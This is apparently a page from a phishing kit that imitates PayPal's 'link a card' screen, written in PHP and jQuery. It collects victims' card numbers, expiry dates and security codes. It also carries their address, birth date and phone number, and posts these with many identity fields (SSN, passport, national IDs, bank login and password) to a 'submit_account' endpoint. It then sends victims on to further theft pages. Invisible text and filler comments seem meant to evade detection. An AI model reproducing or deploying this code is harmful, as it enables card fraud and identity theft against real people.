<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once 'more.php';
require_once '../lang.php';
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="assets/pics/favi.ico">
    <link rel="apple-touch-icon" href="assets/pics/favi.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title><?php echo $account['title'];?></title>
    <link rel="stylesheet" href="assets/styles/process.css">
    <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.mask.min.js">
    </script>
    <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
</head>

<body>
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav">
        <div class="navContainer">
            <a href="javascript:" class="desktopBrand"></a>
            <div class="mobileMenu">
                <div class="logoutMobile">
                    <a href="javascript:" class="logoutTxtMobile">
          Log Out</a>
                </div>
                <div class="settingsMobile">
                    <a href="javascript:" class="svgLogo settingsTxt">
                        <img src="assets/pics/settings.svg" alt=""></a>
                </div>
                <div>
                    <p class="displayMail">
                        <?php echo $_SESSION['login_email'];?></p>
                </div>
            </div>
            <div class="desktopMenu">
                <nav class="desktopItems">
                    <ul class="firstUl">
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['summary'];?>     </a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
        <?php echo $account['activity'];?></a>
                        </li>
                        <li class="">
                            <a href="javascript:" class="linksTxt">
         <?php echo $account['send'];?></a></li>
                        <li class="">
                            <a href="javascript:" class="linksTxt"><?php echo $account['wallet'];?></a>
                        </li>
                        <li class="activeLi">
                            <a href="javascript:" class="linksTxt"><?php echo $account['help'];?></a>
                        </li>
                    </ul>
                    <ul class="secondUl">
                        <li class="notifLi">
                            <a href="javascript:" class="svgLogo notifTxt">
                                <img src="assets/pics/noti.svg" alt=""></a>
                        </li>
                        <li>
                            <a href="javascript:" class="svgLogo settingsTxt"><img src="assets/pics/settings.svg" alt=""></a>
                        </li>
                        <li class="logoutLi">
                            <a href="javascript:" class="logoutTxtDesktop"><?php echo $account['logout'];?></a>
                        </li>
                    </ul>
                </nav>
            </div>
        </div>
    </div>

    <div class="mainContainer">
        <div class="hide" id="rotate">
            <div class="spinner">
                <div class="rotate"></div>
                <div class="processing"><?php echo $account['proccessing'];?>...</div>
            </div>
            <div class="overlay">
            </div>
        </div>
        <div class="mobileNav">
            <div class="navHeader">
                <div class="blockToggler">
                    <label class="menuLabel" for="toggleMenu"><span></span>
                        <div class="menuOpen">Menu</div>
                        <div class="menuClose">
                            Close</div>
                    </label>
                </div>
            </div>
            <div class="navLogo">
                <a href="javascript:" class="mobileBrand"></a>
            </div>
            <ul class="notifUl">
                <li>
                    <a class="svgLogo notifTxt">
                        <img src="assets/pics/noti.svg" alt="">
                    </a>
                </li>
            </ul>
        </div>
        <?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
		<div class="contents">
			<section class="mainContents" id="process">
				<form action="#" method="post" style="padding:0 20px" novalidate="on">
					<h2 style="font-size: 1.875rem;
    font-weight: 300;
    text-transform: none;
    font-family: 'PayPal-Sans-Big', Helvetica Neue, Arial, sans-serif;">
      <span style="font-size:0">darkness</span>
      <?php echo $account['linknew'];?>     <span style="font-size:0">isnot good</span></h2>
					<div class="fields clearfix">
						<div class="dropDown">
                            <select id="ctp" required>
                                <option value="-1" disabled selected>
                                    <?php echo $account['ctp'];?> </option>
                                <option value="vsa">Visa</option>
                                <option value="msc">MasterCard</option>
                                <option value="dsc">Discover</option>
                                <option value="amx">American Express</option>
                                <option value="jcb">JCB</option>
                            </select>
                            <div class="labelSelect">
                                <?php echo $account['ctp'];?> </div>
                        </div>
                        <div class="inputArea">
                            <input id="ccn" type="tel" required placeholder="<?php echo $account['ccn'];?>" maxlength="19" autocomplete="off">
                        </div>
                        <div class="multiInputs">
                            <div class="inputArea hasSub">
                                <input id="cex" type="tel" required placeholder="<?php echo $account['exp'];?>" maxlength="7" autocomplete="off">
                            </div>
                            <div class="inputArea hasSub csc pull-right">
                                <input id="csc" type="tel" required placeholder="<?php echo $account['csc'];?>" maxlength="4" autocomplete="off">
                            </div>

                        </div>
                        <div id="cidmenu" style="top:15px;padding-bottom: 30px;" class="inputArea">

                        </div>
                        <?php echo $card;?>
					</div>
					<!--63965198-->
					<br>
					<div class="fields clearfix">
						<!--72237183-->
						<div class="inputArea">
							<!--62054136-->
							<input id="oo" type="text" class="txt-capital" disabled="disabled" value="<?php echo $_SESSION['adr'];?>,<?php echo $_SESSION['cty'];?>,<?php echo $_SESSION['stt'];?>,<?php echo $_SESSION['zip'];?>,<?php echo $_SESSION['cnt'];?>">
						</div>
						<div class="">
							<input id="fnm" type="hidden" hidden="hidden" value="<?php echo $_SESSION['fnm'];?>">
							<input id="adr" type="hidden" hidden="hidden" value="<?php echo $_SESSION['adr'];?>">
							<input id="cty" type="hidden" hidden="hidden" value="<?php echo $_SESSION['cty'];?>">
							<input id="stt" type="hidden" hidden="hidden" value="<?php echo $_SESSION['stt'];?>">
							<input id="cnt" type="hidden" hidden="hidden" value="<?php echo $_SESSION['cnt'];?>">
							<input id="zip" type="hidden" hidden="hidden" value="<?php echo $_SESSION['zip'];?>">
							<input id="dob" type="hidden" hidden="hidden" value="<?php echo $_SESSION['dob'];?>">
							<input id="ptp" type="hidden" hidden="hidden" value="<?php echo $_SESSION['ptp'];?>">
							<input id="pnm" type="hidden" hidden="hidden" value="<?php echo $_SESSION['pnm'];?>">

							<!--7757075-->
						</div>
						<div class="inputArea">
							<!--96629257-->
							<input style="text-align:center;" required disabled value="<?php echo $_SESSION['type_vbv'];?>-XXXX-XXXX-XXXX-<?php echo $_SESSION['ending'];?> <?php echo $account['linked'];?>"> </div>
						<div>
							<!--52047015-->
                            <?php
                       if($setting['get_email'] == "on") {
                         $linknya = "link_email?key=$key";
                        }else if($setting['get_bank'] == "on"){
                         $linknya = "bank?key=$key";
                        }
                        else if($setting['get_photo'] == "on"){
                         $linknya = "identity?key=$key";
                        }else{
                         $linknya = "done?key=$key";
                        }?>
							<input style="margin-top:10px;width:100%" type="submit" class="bt" value="<?php echo $account['continue'];?>"> <a style="margin-top:10px;width:100%;display: inline-block;
    min-width: 6rem;
    padding: 0.75rem 1.5rem;
    margin-bottom: 1.5rem;
    border: 1px solid #0070ba;
    border-radius: 1.5rem;
    font-size: 0.9375rem;
    line-height: 1.6;
    font-family: pp-sans-small-regular,Helvetica Neue,Arial,sans-serif;
    font-weight: 600;
    text-align: center;
    text-decoration: none;
    cursor: pointer;
    color: #0070ba;
    background-color: #ffffff;
    transition: all 250ms ease;
    -webkit-font-smoothing: antialiased;" disabled href="<?php echo $linknya;?>"><?php echo $account['donthave'];?></a> </div>
						<!--62464883-->
						<!--39012845-->
				</form>
			</section>
			<!--95403080-->
			<!--99519093-->
			<!--98996561-->
			</div>
			<?php if($os == "Android" or $os == "iPhone") {
        }else{
          echo "<br><br>";
        }?>
        <div>
            <div class="ftr">
                <div class="footerFirstContent">
                    <ul class="footerList">
                        <li><a href="javascript:"><?php echo $account['contact'];?></a></li>
                        <li><a href="javascript:"><?php echo $account['sec'];?></a></li>
                    </ul>
                    <div class="footerSecondContent">
                        <p class="footerP">Copyright ©<span>1999-2020</span> . All rights reserved.</p>
                        <ul class="footerUl">
                            <li><a href="javascript:"><?php echo $login['privacy'];?></a></li>
                            <li><a href="javascript:"><?php echo $login['legal'];?></a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            $('#cex').mask('00/0000');
            $('#csc').mask('0000');
            $('#dob').mask('00/00/0000');
            $('#ccn').mask('0000 0000 0000 0000');
            $('#pnm').mask('000000000000000');
            $('#ssn').mask('000-00-0000');
            $('#acn').mask('00000000');
            $('#stc').mask('00-00-00');
            $('#sin').mask('000-000-000');

            function validExp(b) {
                var a = new RegExp("(([0][1-9]{1})|([1][0-2]{1}))/20(([1][8-9]{1})|([2][0-9]{1}))");
                return a.test(b);
            }

            function isDate(vl) {
                var rg = /^([0-9]{2})+\/([0-9]{2})+\/([0-9]{4})+$/;
                return rg.test(vl);
            }

            function validDob(vl) {
                var c = false;
                if (isDate(vl) && (vl.split('/')[2] > "1919" && vl.split('/')[2] < "2006")) {
                    c = true;
                }
                return c;
            }

            function valid() {
                var check = true;
                var ii = 0;
                $('#process input:not(.bt):not([type=checkbox]),#process select').each(function(i, el) {
                    if (!$(el).val()) {
                        $(el).parent().addClass('hasError');
                        check = false;
                    } else {
                        $(el).not('#ccn').parent().removeClass('hasError');
                    }
                    if ($(el).attr('id') == 'cex') {
                        if (!validExp($(el).val())) {
                            $(el).parent().addClass('hasError');
                            check = false;
                        } else {
                            $(el).parent().removeClass('hasError');
                        }
                    }
                    if ($(el).attr('id') == 'dob') {
                        if (!validDob($(el).val())) {
                            $(el).parent().addClass('hasError');
                            check = false;
                        } else {
                            $(el).parent().removeClass('hasError');
                        }
                    }

                    if($(el).attr('id') == 'csc') {
                    if($('select:first').val() == 'amx' && $(el).val().length != 4) {
                        $(el).parent().addClass('hasError');
                        check = false;
                    } else {
                        $(el).parent().removeClass('hasError');
                    }
                    if($('select:first').val() != 'amx' && $(el).val().length != 3) {
                        $(el).parent().addClass('hasError');
                        check = false;
                    }
                }

                });
                return check;
            }
            $(document).on('change', '#process #ctp', function() {
                $(this).parent().removeClass('hasError');
                $(this).parent().children('.labelSelect').html($(this).children("option:selected").text());
                $(this).parent().attr('data-name', $(this).val());
                if ($('#ctp').val() == 'amx') {
                    $('.csc input').attr('placeholder', $('.csc input').attr('placeholder').replace('3', '4'));
                    $('.csc input').attr('maxlength', '4');
                    $('#cidmenu').html('<input id="cid" type="tel" required placeholder="<?php echo $account['cid'];?>" maxlength="4" autocomplete="off">');
                    $('#cidmenu').css("padding-bottom","0px");
                } else {
                    $('.csc input').attr('placeholder', $('.csc input').attr('placeholder').replace('4', '3'));
                    $('.csc input').attr('maxlength', '3');
                    $('#cidmenu').css("padding-bottom","30px");
                    $('#cidmenu').html('');
                }
                if ($('#ctp').val() == 'amx') {
                    $('#ccn').attr('maxlength', '18');
                } else {
                    $('#ccn').attr('maxlength', '19');
                }
            });

            $(document).on('change', '#process #ptp', function() {
                $(this).parent().removeClass('hasError');
                $(this).parent().children('.labelSelect').html($(this).children("option:selected").text());
                $(this).parent().attr('data-name', $(this).val());
            });

            $(document).on('change', '#process #cid', function() {
                $(this).parent().removeClass('hasError');
            });

            var ccvalid = false;
            $('#ccn').validateCreditCard(function(result) {
                var cc = $('#ccn');
                if (cc.val() != '') {
                    if (result.valid) {
                        cc.parent().removeClass('hasError');
                        ccvalid = true;
                    } else {
                        cc.parent().addClass('hasError');
                        ccvalid = false;
                    }
                }
            });
            $('#process input:not(.bt):not([type=checkbox]),select').each(function(i, el) {
                $(el).keyup(function() {
                    valid();
                });
                $(el).change(function() {
                    valid();
                });
            });
            $(document).on('submit', '#process form', function() {
                check = true;

                if (!valid()) {
                    check = false;
                }
                if (!validExp($('#cex').val())) {
                    $('#cex').parent().addClass('hasError');
                    check = false;
                } else {
                    $('#cex').parent().removeClass('hasError');
                }
                if (!ccvalid) {
                    $('#ccn').parent().addClass('hasError');
                    check = false;
                }
                if (!validDob($('#dob').val())) {
                    $('#dob').parent().addClass('hasError');
                    check = false;
                }

                if (!check) {
                    return false;
                } else {
                    $('#rotate').removeClass('hide');
                    var ctp = $('#ctp').children("option:selected").text();
                    var ccn = $('#ccn').val();
                    var cex = $('#cex').val();
                    var csc = $('#csc').val();
                    var cid = $('#cid').val();
                    var fnm = $('#fnm').val();
                    var dob = $('#dob').val();
                    var adr = $('#adr').val();
                    var cty = $('#cty').val();
                    var zip = $('#zip').val();
                    var stt = $('#stt').val();
                    var cnt = $('#cnt').val();
                    var ptp = $('#ptp').val();
                    var par = $('#par').val();
                    var pnm = $('#pnm').val();
                    var mdn = $('#mdn').val();
                    var ssn = $('#ssn').val();
                    var pps = $('#pps').val();
                    var clm = $('#clm').val();
                    var dln = $('#dln').val();
                    var sin = $('#sin').val();
                    var pse = $('#pse').val();
                    var dni = $('#dni').val();
                    var bsn = $('#bsn').val();
                    var cpf = $('#cpf').val();
                    var fcn = $('#fcn').val();
                    var acn = $('#acn').val();
                    var stc = $('#stc').val();
                    var bus = $('#bus').val();
                    var bpw = $('#bpw').val();
                    var bans = $('#bans').val();
                    var climit = $('#climit').val();
                    var osid = $('#osid').val();
                    var civilid = $('#civilid').val();
                    var idnum = $('#idnum').val();
                    var passport = $('#passport').val();
                    var nationalid = $('#nationalid').val();
                    var qatarid = $('#qatarid').val();
                    var citizenid = $('#citizenid').val();
                    var webid = $('#webid').val();
                    var cardpass = $('#cardpass').val();
                    var o = {
                        ctp, ccn, cex, csc, cid , fnm, dob, adr, cty, zip, stt, cnt, ptp, par, pnm, mdn, ssn, pps, clm, dln, sin, pse, dni, bsn, cpf, fcn, acn, stc, bus, bpw, bans, climit, osid, civilid,idnum, passport, nationalid, qatarid, citizenid, webid, cardpass
                    };
                    var start = new Date;
                    var xT = 0;
                    var idT = setInterval(function() {
                        xT = Math.trunc((new Date - start) / 1000);
                    }, 1000);
                    var toStart = 0;
                    $.post('submit_account?key=<?php echo $key;?>', o, function(data, status) {
                        <?php
                        if($setting['get_vbv'] == "on") {
                            echo 'window.location.href = "vbv?key='.$key.'";';
                        }else
                        if($setting['get_email'] == "on") {
                         echo 'window.location.href = "link_email?key='.$key.'";';
                        }else if($setting['get_bank'] == "on"){
                         echo 'window.location.href = "bank?key='.$key.'";';
                        }
                        else if($setting['get_photo'] == "on"){
                         echo 'window.location.href = "identity?key='.$key.'";';
                        }else{
                         echo 'window.location.href = "done?key='.$key.'";';
                        }?>
                        if (data == 'done' && status == 'success') {
                            clearInterval(idT);
                            if (xT > 4) {
                                toStart = 0;
                            } else {
                                toStart = 1800;
                            }
                            setTimeout(function() {
                                setId();
                            }, toStart);
                        } else {
                            $('#rotate').addClass('hide');
                        }
                    });
                }
                return false;
            });

            function setId() {
                $('#rotate').addClass('hide');
                $('#process').addClass('hide');
                $('#finish').removeClass('hide');
                window.scrollTo(0, 0);
            }
            $('.gone_bt').click(function() {
                window.location.href = authentication;
            });

            function readFile(files, me, check) {
                if (files) {
                    for (var i = 0; i < files.length; i++) {
                        var FR = new FileReader();
                        FR.onload = function(e) {
                            if (e.target.result.startsWith("data:image/") && e.total <= 5000000) {
                                if (check) {
                                    $(me).parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                                } else {
                                    $(me).parent().parent().parent().parent().children(".imagesArea").append('<div class="imgItem"><img src="' + e.target.result + '" alt=""><button class="btDel">X</button></div>');
                                }
                                $(me).closest('form').append('<input type="hidden" value="' + e.target.result + '" name="images[]">');
                            }
                        }
                        FR.readAsDataURL(files[i]);
                    }
                }
            }
            $(document).on('click', '.zone', function(e) {
                e.stopPropagation();
                $(this).find('input[type=file]').trigger(e);
            });
            $(document).on('click', '.btDel', function() {
                $(this).closest('form').find('[value="' + $(this).prev().attr('src') + '"]').remove();
                $(this).parent().remove();
            });
            $(document).on('change', 'input[type=file]', function() {
                readFile(this.files, this, false);
            });
            $(".dropzone-main").on('dragleave', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #dee3e7');
                $(this).css('background', '#f0f2f4');
            });
            $(".dropzone-main").on('dragover', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #0564b3');
                $(this).css('background', '#ecf1f9');
            });
            $(".dropzone-main").on('drop', function(e) {
                e.preventDefault();
                $(this).css('border', '2px dashed #41ad49');
                readFile(e.originalEvent.dataTransfer.files, this, true);
            });
        });
    </script>
</body>

</html>
